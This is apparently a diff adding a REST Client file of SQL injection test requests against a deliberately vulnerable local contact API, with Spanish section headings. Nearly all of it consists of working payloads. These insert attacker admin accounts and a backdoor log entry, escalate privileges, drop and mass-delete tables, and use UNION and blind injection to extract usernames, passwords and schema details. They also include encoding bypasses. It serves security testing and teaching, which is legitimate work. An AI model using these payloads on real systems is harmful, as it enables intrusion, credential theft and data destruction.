@@ -1,0 +1,194 @@
+### SQL Injection - Contact Endpoints (Frontend + REST Client)
+### ⚠️ VULNERABLE ENDPOINTS FOR TESTING
+### Estos payloads funcionan tanto desde el formulario web como desde REST Client
+
+# Variables
+@baseUrl = http://localhost:3000
+@contentType = Content-Type: application/json
+
+### =====================================================
+### PRUEBAS BÁSICAS
+### =====================================================
+
+### 1. Normal contact submission (Safe)
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "John Doe",
+  "email": "john@example.com",
+  "message": "This is a normal message"
+}
+
+### 2. SQL Injection - OR condition (basic)
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "1' OR '1'='1",
+  "email": "test@test.com",
+  "message": "Basic OR injection"
+}
+
+### =====================================================
+### PRUEBAS AVANZADAS - POST
+### =====================================================
+
+### 3. Create admin user via SQL Injection (CRITICAL)
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "test'); INSERT INTO users (username, email, password, role) VALUES ('attacker', 'attacker@evil.com', 'password123', 'admin'); --",
+  "email": "attacker@test.com",
+  "message": "Creating admin user"
+}
+
+### 4. Update user privileges to admin
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "test'); UPDATE users SET role='admin' WHERE username='user'; --",
+  "email": "test@test.com",
+  "message": "Escalating privileges"
+}
+
+### 5. Drop table contacts (DESTRUCTIVE)
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "test'); DROP TABLE contacts; --",
+  "email": "hacker@example.com",
+  "message": "Attempting to drop table"
+}
+
+### 6. Comment bypass
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "admin' --",
+  "email": "test@test.com",
+  "message": "Comment bypass"
+}
+
+### 7. SQL Injection in email field
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "Normal Name",
+  "email": "test@example.com' OR '1'='1",
+  "message": "Injection in email field"
+}
+
+### 8. Error-based extraction
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "1' AND extractvalue(1, concat(0x5c, (SELECT database()))) --",
+  "email": "test@test.com",
+  "message": "Error extraction"
+}
+
+### =====================================================
+### PRUEBAS - GET (Ver/Buscar Contactos)
+### =====================================================
+
+### 9. Get all contacts (normal)
+GET {{baseUrl}}/api/contacts
+
+### 10. Get contacts with OR injection
+GET {{baseUrl}}/api/contacts?search=1' OR '1'='1
+
+### 11. Extract all users with passwords
+GET {{baseUrl}}/api/contacts?search=' UNION SELECT id, username, password, email FROM users --
+
+### 12. Extract database name
+GET {{baseUrl}}/api/contacts?search=' UNION SELECT database(), version(), user(), current_timestamp --
+
+### 13. Extract table structure
+GET {{baseUrl}}/api/contacts?search=' UNION SELECT table_name, column_name, data_type, table_schema FROM information_schema.columns WHERE table_schema=database() --
+
+### 14. Time-based blind SQL Injection
+GET {{baseUrl}}/api/contacts?search=1' AND SLEEP(5) --
+
+### 15. Boolean-based blind SQL Injection
+GET {{baseUrl}}/api/contacts?search=1' AND (SELECT COUNT(*) FROM users) > 0 --
+
+### =====================================================
+### PRUEBAS - GET ESPECÍFICO (Ver Contacto por ID)
+### =====================================================
+
+### 16. Get specific contact (normal)
+GET {{baseUrl}}/api/contacts/1
+
+### 17. Get all contacts via ID injection
+GET {{baseUrl}}/api/contacts/1 OR 1=1
+
+### =====================================================
+### PRUEBAS - DELETE (Eliminar - DESTRUCTIVE)
+### =====================================================
+
+### 18. Delete specific contact (normal)
+DELETE {{baseUrl}}/api/contacts/1
+
+### 19. Delete all contacts (SQL Injection) ⚠️ DESTRUCTIVE
+DELETE {{baseUrl}}/api/contacts/1 OR 1=1
+
+### =====================================================
+### PAYLOADS AVANZADOS
+### =====================================================
+
+### 20. Stacked queries - Insert admin
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "x'); INSERT INTO users (username, email, password, role) VALUES ('hacker2', 'hacker2@evil.com', 'hack456', 'admin'); INSERT INTO audit_log (action, details) VALUES ('backdoor_created', 'Admin user created'); --",
+  "email": "test@test.com",
+  "message": "Multiple injections"
+}
+
+### 21. Exfiltrate user data into contacts table
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "x'); INSERT INTO contacts (nombre, email, mensaje, ip_address) SELECT id, username, password, email FROM users; --",
+  "email": "test@test.com",
+  "message": "Exfiltrating user data"
+}
+
+### 22. Union-based in POST (may fail due to column count, but demonstrates attempt)
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "1' UNION SELECT id, username, password, email FROM users --",
+  "email": "test@test.com",
+  "message": "Union attempt"
+}
+
+### 23. Case sensitivity bypass
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "1' UnIoN SeLeCt id, username, password, email FROM users --",
+  "email": "test@test.com",
+  "message": "Case sensitivity test"
+}
+
+### 24. Hex encoding bypass
+POST {{baseUrl}}/api/contacts
+{{@contentType}}
+
+{
+  "name": "1' UNION SELECT 0x69642c, 0x7573657, 0x726e616d65, 0x706173 FROM users --",
+  "email": "test@test.com",
+  "message": "Hex encoding test"
+}
